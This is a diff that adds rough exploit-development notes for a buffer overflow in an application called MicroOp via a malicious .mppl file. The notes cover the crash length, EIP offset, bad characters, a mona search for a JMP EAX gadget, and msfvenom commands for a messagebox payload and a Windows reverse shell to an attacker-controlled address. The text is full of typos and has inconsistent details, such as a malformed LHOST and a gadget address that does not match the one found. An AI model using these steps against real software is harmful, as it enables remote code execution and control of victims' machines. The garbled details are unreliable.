@@ -1,0 +1,32 @@
+Micro_op  app  use .mppl file 
+APp MicroOp
+ip 192.168.0.134
+Port - NA
+______________All file send in win directly for explit____________________
+
+1. crashsing buffer (.mpll file ) A*4000
+2. Finding EIP and offset =>71423571 (/pattern_offset.rb -l 4000 -q 71423571
+[*] Exact match at offset 1276)
+
+3.  checkl for eip controled at 1276 sednd paylaod with "A" * 1276 +"B" * 4 +"C" 8300
+
+4. cehck all data comein buffer
+
+5. finding bad character run bad -cahr.mpll and cehck EAX register (0048dd1c+514)
+  bad cahr=\x00\x0a\x0d\
+
+6. now we arefer to EAX so let find JMP EAX {00000000  FFE0   JMP EAX}
+
+7.  !mona modules | !mona find -s "\xff\xe0" -m user32.dll
+
+Log data, item 24
+ Address=7595509B
+ Message=  0x7595509b (b+0x003f509b)  : "\xff\xe0" |  {PAGE_READONLY} [shell32.dll] ASLR: True, Rebase: True, SafeSEH: True, OS: True, v6.1.7601.17514 (C:\Windows\syswow64\shell32.dll)
+
+ 8. EIp control JMP eax (74AD957B)} = >"\x7b\x95\xad\x74"
+
+ 9 .Shellcode 
+
+ msfvenom -p windows/messagebox -f -c -b "\x00\x0a\x0d"
+10 revershe shell
+ msfvenom -p windows/shell_reverse_tcp LHOS=1192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\x0a\x0d
